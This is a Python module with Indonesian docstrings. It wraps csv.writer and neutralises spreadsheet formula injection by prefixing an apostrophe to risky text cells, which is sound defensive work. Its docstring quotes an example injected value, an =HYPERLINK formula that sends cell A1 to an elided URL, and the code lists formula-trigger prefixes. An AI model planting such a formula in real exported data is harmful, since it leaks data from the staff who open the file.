"""Penulis CSV yang tidak bisa dipakai menjalankan rumus di Excel.

Sel yang diawali `=`, `+`, `-`, `@`, tab, atau carriage return dieksekusi
Excel dan LibreOffice sebagai rumus saat berkasnya dibuka — bukan ditampilkan
sebagai teks. Nama pelanggan, judul tiket, deskripsi paket, dan catatan di
aplikasi ini semuanya diketik manusia, dan ekspor CSV memang dibuat untuk
dibuka di Excel. Satu pelanggan bernama `=HYPERLINK("http://…"&A1,"klik")`
sudah cukup mengubah rekap bulanan jadi alat penyedot data, dan yang
membukanya adalah staf billing di komputer kantor.

Yang dipakai: awalan petik satu. Excel menampilkan sel `'=1+1` sebagai teks
`=1+1` persis aslinya. Alternatifnya — membuang atau mengosongkan sel
berbahaya — membuat ekspor diam-diam berbeda dari data yang sebenarnya, dan
itu lebih buruk daripada berkas yang jelek.

Modul ini adalah satu-satunya tempat `csv.writer` boleh dipanggil;
`tests/test_csv_aman.py` menjaganya. Menambal enam pemanggil satu per satu
tanpa penjaga berarti penulis CSV ketujuh besok lahir tanpa tambalan.
"""

import csv

AWALAN_RUMUS = ("=", "+", "-", "@", "\t", "\r")


def sel(nilai):
    """Nilai satu sel, dinetralkan bila perlu.

    Hanya teks yang disentuh. Nilai bertipe angka (`Decimal`, `int`) tidak
    pernah berasal dari ketikan bebas, dan memberinya petik membuat seluruh
    kolom nominal berubah jadi teks di Excel — `SUM` di bawahnya berhenti
    bekerja, dan itu justru merusak berkas yang mau diselamatkan.
    """
    if nilai is None:
        return ""
    if not isinstance(nilai, str):
        return nilai
    if nilai.startswith(AWALAN_RUMUS):
        return "'" + nilai
    return nilai


class _Penulis:
    """Pembungkus tipis `csv.writer` yang menetralkan setiap sel."""

    def __init__(self, keluaran, **opsi):
        self._tulis = csv.writer(keluaran, **opsi)

    def writerow(self, baris):
        return self._tulis.writerow([sel(nilai) for nilai in baris])

    def writerows(self, baris_baris):
        for baris in baris_baris:
            self.writerow(baris)


def penulis(keluaran, **opsi) -> _Penulis:
    """Pengganti `csv.writer` dengan antarmuka yang sama."""
    return _Penulis(keluaran, **opsi)
